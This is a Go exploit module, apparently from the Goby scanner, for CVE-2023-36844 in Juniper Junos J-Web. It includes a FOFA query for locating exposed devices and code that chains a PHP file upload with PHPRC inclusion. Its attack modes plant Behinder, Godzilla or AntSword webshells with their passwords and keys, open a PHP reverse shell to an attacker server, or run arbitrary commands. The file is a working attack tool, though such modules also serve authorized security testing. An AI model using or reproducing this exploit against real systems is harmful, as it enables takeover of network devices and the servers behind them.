package exploits

import (
	"encoding/base64"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net"
	"net/url"
	"strconv"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Junos webauth_operation.php File Upload Vulnerability (CVE-2023-36844)",
    "Description": "<p>Junos is a reliable, high-performance network operating system from Juniper Networks.</p><p>An attacker can use the J-Web service /webauth_operation.php route of the Junos operating system to upload a php webshell, include it through the ?PHPRC parameter, and gain control of the entire web server.</p>",
    "Product": "JUNIPer-Web-EQPT-Manager",
    "Homepage": "https://www.juniper.net/",
    "DisclosureDate": "2023-08-17",
    "Author": "m0x0is3ry@foxmail.com",
    "FofaQuery": "title=\"Juniper Web Device Manager\" || banner=\"juniper\" || header=\"juniper\" || body=\"svg4everybody/svg4everybody.js\" || body=\"juniper.net/us/en/legal-notices\" || body=\"nativelogin_login_credentials\"",
    "GobyQuery": "title=\"Juniper Web Device Manager\" || banner=\"juniper\" || header=\"juniper\" || body=\"svg4everybody/svg4everybody.js\" || body=\"juniper.net/us/en/legal-notices\" || body=\"nativelogin_login_credentials\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The manufacturer has released a vulnerability fix, please pay attention to updates in time: <a href=\"https://supportportal.juniper.net/JSA72300\">https://supportportal.juniper.net/JSA72300</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "webshell,reverse,cmd",
            "show": ""
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla,antsword,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<?php echo \"hello\"; ?>",
            "show": "attackType=webshell,webshell=custom"
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Inclusion",
        "File Upload",
        "Command Execution"
    ],
    "VulType": [
        "File Inclusion",
        "File Upload",
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2023-36844"
    ],
    "CNNVD": [
        "CNNVD-202308-1556"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Junos webauth_operation.php 文件上传漏洞（CVE-2023-36844）",
            "Product": "JUNIPer-Web-Device-Manager",
            "Description": "<p>Junos 是 Juniper Networks 生产的一款可靠的高性能网络操作系统。<br></p><p>攻击者可利用 Junos 操作系统的 J-Web 服务 /webauth_operation.php 路由上传 php webshell，通过 ?PHPRC 参数进行包含，进入控制整个 web 服务器。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://supportportal.juniper.net/JSA72300\" target=\"_blank\">https://supportportal.juniper.net/JSA72300</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端写入后门，执行代码，获取服务器权限，进而控制整个 web 服务器。<br></p>",
            "VulType": [
                "命令执行",
                "文件上传",
                "文件包含"
            ],
            "Tags": [
                "文件包含",
                "文件上传",
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Junos webauth_operation.php File Upload Vulnerability (CVE-2023-36844)",
            "Product": "JUNIPer-Web-EQPT-Manager",
            "Description": "<p>Junos is a reliable, high-performance network operating system from Juniper Networks.</p><p>An attacker can use the J-Web service /webauth_operation.php route of the Junos operating system to upload a php webshell, include it through the ?PHPRC parameter, and gain control of the entire web server.</p>",
            "Recommendation": "<p>The manufacturer has released a vulnerability fix, please pay attention to updates in time: <a href=\"https://supportportal.juniper.net/JSA72300\" target=\"_blank\">https://supportportal.juniper.net/JSA72300</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "File Inclusion",
                "File Upload",
                "Command Execution"
            ],
            "Tags": [
                "File Inclusion",
                "File Upload",
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-10-17",
    "PocId": "10835"
}`

	sendPayload7f026c97 := func(hostInfo *httpclient.FixUrl, content string) (*httpclient.HttpResponse, error) {
		rawfilename := goutils.RandomHexString(8)
		phpfilename := rawfilename + ".php"
		inifilename := rawfilename + ".ini"
		content = content + "<!--"
		cfg := httpclient.NewPostRequestConfig("/webauth_operation.php")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.Data = "rs=do_upload&rsargs[0]=[{\"fileData\":\"data:text/html;base64," + url.QueryEscape(base64.StdEncoding.EncodeToString([]byte(content))) + "\",\"fileName\":\"" + phpfilename + "\",\"csize\":" + strconv.Itoa(len(content)) + "}]"
		rsp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil || !strings.Contains(rsp.Utf8Html, "converted_fileName") || !strings.Contains(rsp.Utf8Html, "original_fileName") {
			return nil, err
		}
		phpfilename = rsp.Utf8Html[strings.Index(rsp.Utf8Html, ":{\"converted_fileName\":  {0: '")+30 : strings.Index(rsp.Utf8Html, "'}, \"original_fileName\":")]
		cfgInclude := httpclient.NewPostRequestConfig("/webauth_operation.php")
		cfgInclude.VerifyTls = false
		cfgInclude.FollowRedirect = false
		cfgInclude.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		auto_prepend_file := "auto_prepend_file=\"/var/tmp/" + phpfilename + "\""
		cfgInclude.Data = "rs=do_upload&rsargs[0]=[{\"fileData\":\"data:plain/text;base64," + url.QueryEscape(base64.StdEncoding.EncodeToString([]byte(auto_prepend_file))) + "\",\"fileName\":\"" + inifilename + "\",\"csize\":" + strconv.Itoa(len(auto_prepend_file)) + "}]"
		rspInclude, err := httpclient.DoHttpRequest(hostInfo, cfgInclude)
		if err != nil || !strings.Contains(rsp.Utf8Html, "converted_fileName") || !strings.Contains(rsp.Utf8Html, "original_fileName") {
			return nil, err
		}
		inifilename = rspInclude.Utf8Html[strings.Index(rspInclude.Utf8Html, ":{\"converted_fileName\":  {0: '")+30 : strings.Index(rspInclude.Utf8Html, "'}, \"original_fileName\":")]
		cfgCheck := httpclient.NewGetRequestConfig("/webauth_operation.php?PHPRC=/var/tmp/" + inifilename)
		cfgCheck.VerifyTls = false
		cfgCheck.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, cfgCheck)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(8)
			rsp, _ := sendPayload7f026c97(u, "<?php echo \""+checkStr+"\";unlink(__FILE__); ?>")
			return rsp != nil && rsp.StatusCode == 200 && strings.Contains(rsp.Utf8Html, checkStr) && !strings.Contains(rsp.Utf8Html, "echo \""+checkStr+"\"")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			content := goutils.B2S(ss.Params["content"])
			attackType := goutils.B2S(ss.Params["attackType"])
			webshell := goutils.B2S(ss.Params["webshell"])
			if attackType == "webshell" {
				if webshell == "antsword" {
					content = `<?php eval($_POST['ant']); ?>`
				} else if webshell == "behinder" {
					// 该密钥为连接密码 32 位 md5 值的前 16 位，默认连接密码 rebeyond
					content = `<?php @error_reporting(0);session_start();$key="e45e329feb5d925b";$_SESSION['k']=$key;session_write_close();$post=file_get_contents("php://input");if(!extension_loaded('openssl')){$t="base64_"."decode";$post=$t($post."");for($i=0;$i<strlen($post);$i++){$post[$i]=$post[$i]^$key[$i+1&15];}}else{$post=openssl_decrypt($post,"AES128",$key);}$arr=explode('|',$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p){eval($p."");}}@call_user_func(new C(),$params);?>`
				} else if webshell == "godzilla" {
					// 哥斯拉 pass key
					content = `<?php @session_start();@set_time_limit(0);@error_reporting(0);function encode($D,$K){for($i=0;$i<strlen($D);$i++){$c=$K[$i+1&15];$D[$i]=$D[$i]^$c;}return $D;}$pass='pass';$payloadName='payload';$key='3c6e0b8a9c15224a';if(isset($_POST[$pass])){$data=encode(base64_decode($_POST[$pass]),$key);if(isset($_SESSION[$payloadName])){$payload=encode($_SESSION[$payloadName],$key);if(strpos($payload,"getBasicsInfo")===false){$payload=encode($payload,$key);}eval($payload);echo substr(md5($pass.$key),0,16);echo base64_encode(encode(@run($data),$key));echo substr(md5($pass.$key),16);}else{if(strpos($data,"getBasicsInfo")!==false){$_SESSION[$payloadName]=encode($data,$key);}}}?>`
				}
				rsp, err := sendPayload7f026c97(expResult.HostInfo, content)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				// 资源存在
				if rsp.StatusCode != 200 && rsp.StatusCode != 503 && rsp.StatusCode != 500 {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
					return expResult
				}
				expResult.Success = true
				expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + rsp.Request.URL.Path + "?" + rsp.Request.URL.RawQuery + "\n"
				if webshell == "behinder" {
					expResult.Output += "Password: rebeyond\n"
					expResult.Output += "WebShell tool: Behinder v3.0\n"
				} else if webshell == "godzilla" {
					expResult.Output += "Password: pass 加密器：PHP_XOR_BASE64\n"
					expResult.Output += "WebShell tool: Godzilla v4.1\n"
				} else if webshell == "antsword" {
					expResult.Output += "Password: ant\n"
					expResult.Output += "WebShell tool: Antsword v4.0.3\n"
				}
				expResult.Output += "Webshell type: php"
			} else if attackType == "reverse" {
				waitSessionCh := make(chan string)
				rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh)
				if err != nil {
					expResult.Success = false
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				addr := godclient.GetGodServerHost()
				ip := net.ParseIP(addr)
				if ip != nil {
					addr = ip.String()
				} else {
					ips, err := net.LookupIP(addr)
					if err != nil {
						expResult.Success = false
						expResult.Output = err.Error()
					}
					addr = ips[0].String()
				}
				go sendPayload7f026c97(expResult.HostInfo, "<?php $sock=fsockopen('"+addr+"',"+rp+");$descriptorspec=array(0=>$sock,1=>$sock,2=>$sock);$process=proc_open('/bin/sh',$descriptorspec,$pipes);proc_close($process); ?>")
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 15):
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
			} else if attackType == "cmd" {
				cmd := goutils.B2S(ss.Params["cmd"])
				checkStr := goutils.RandomHexString(8)
				rsp, err := sendPayload7f026c97(expResult.HostInfo, `<?php echo `+strconv.Quote(checkStr)+`; system('`+cmd+`'); ?>`)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else if strings.Contains(rsp.Utf8Html, checkStr) {
					expResult.Success = true
					expResult.Output = rsp.Utf8Html[strings.Index(rsp.Utf8Html, checkStr)+8 : strings.Index(rsp.Utf8Html, "CACHING FLOW")]
				} else {
					expResult.Success = false
					expResult.Output = `命令不存在，漏洞利用失败`
				}
			} else {
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}

			return expResult
		},
	))
}
